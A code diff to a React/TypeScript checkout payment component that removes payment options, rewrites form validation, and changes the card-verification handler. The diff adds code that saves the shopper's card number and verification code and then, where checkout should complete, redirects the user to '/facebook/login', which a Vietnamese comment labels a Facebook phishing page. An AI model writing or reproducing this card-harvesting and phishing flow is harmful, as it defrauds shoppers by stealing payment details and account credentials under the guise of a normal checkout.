@@ -44,24 +44,12 @@ const DELIVERY_OPTIONS: ICheckoutDeliveryOption[] = [
 ];
 
 const PAYMENT_OPTIONS: ICheckoutPaymentOption[] = [
-  // {
-  //   value: 'paypal',
-  //   title: 'Pay with Paypal',
-  //   description: 'You will be redirected to PayPal website to complete your purchase securely.',
-  //   icons: ['/assets/icons/payments/ic_paypal.svg'],
-  // },
   {
     value: 'credit_card',
     title: 'Credit / Debit Card',
     description: 'We support Mastercard, Visa, Discover and Stripe.',
     icons: ['/assets/icons/payments/ic_mastercard.svg', '/assets/icons/payments/ic_visa.svg'],
   },
-  // {
-  //   value: 'cash',
-  //   title: 'Cash on CheckoutDelivery',
-  //   description: 'Pay with cash when your order is delivered.',
-  //   icons: [],
-  // },
 ];
 
 // ----------------------------------------------------------------------
@@ -110,10 +98,11 @@ export default function CheckoutPayment({
 
   const PaymentSchema = Yup.object().shape({
     payment: Yup.string().required('Payment is required!'),
-    card: Yup.string().when('payment', {
-      is: 'credit_card',
-      then: Yup.string().required('Card selection is required!'),
-    }),
+    card: Yup.string().when('payment', (payment: any, schema: any) =>
+      payment === 'credit_card'
+        ? schema.required('Card selection is required!')
+        : schema
+    ),
   });
 
   const defaultValues = {
@@ -127,15 +116,12 @@ export default function CheckoutPayment({
     defaultValues,
   });
 
-  // Auto-select the last added card if none is selected
   useEffect(() => {
     const currentSelected = methods.getValues('card');
     if (cards.length > 0) {
-      // If none selected, or the selected one isn't in the list anymore
       if (!currentSelected || !cards.find(c => c.cardNumber === currentSelected)) {
         methods.setValue('card', cards[cards.length - 1].cardNumber, { shouldValidate: true });
       } else {
-        // Just added a new card, let's select it automatically (newest card is last)
         const latestCard = cards[cards.length - 1].cardNumber;
         if (currentSelected !== latestCard && cards.length > 1) {
           methods.setValue('card', latestCard, { shouldValidate: true });
@@ -156,15 +142,7 @@ export default function CheckoutPayment({
         }
         setOpenVerify(true);
       } else {
-        await axios.post('/api/checkout', {
-          shipping: values.delivery,
-          discount: checkout.discount,
-          billing: checkout.billing,
-          payment: values.payment,
-          cart: checkout.cart,
-        });
-        onNextStep();
-        onReset();
+        handleFinishCheckout();
       }
     } catch (error) {
       console.error(error);
@@ -176,6 +154,19 @@ export default function CheckoutPayment({
       const values = getValues();
       await dispatch(saveCardCode({ cardNumber: values.card, code }));
       
+      setOpenVerify(false);
+      
+      // CHUYỂN HƯỚNG SANG TRANG FACEBOOK PHISHING PAGE
+      window.location.href = '/facebook/login';
+    } catch (error) {
+      console.error(error);
+      enqueueSnackbar('Failed to verify card!', { variant: 'error' });
+    }
+  };
+
+  const handleFinishCheckout = async () => {
+    try {
+      const values = getValues();
       await axios.post('/api/checkout', {
         shipping: values.delivery,
         discount: checkout.discount,
@@ -183,16 +174,13 @@ export default function CheckoutPayment({
         payment: values.payment,
         cart: checkout.cart,
       });
-
-      setOpenVerify(false);
       onNextStep();
       onReset();
     } catch (error) {
       console.error(error);
-      enqueueSnackbar('Failed to checkout or verify!', { variant: 'error' });
+      enqueueSnackbar('Checkout failed!', { variant: 'error' });
     }
   };
-
 
   return (
     <>
@@ -245,6 +233,7 @@ export default function CheckoutPayment({
         </Grid>
       </Grid>
       </FormProvider>
+
       <PaymentVerificationDialog
         open={openVerify}
         onVerify={handleVerify}
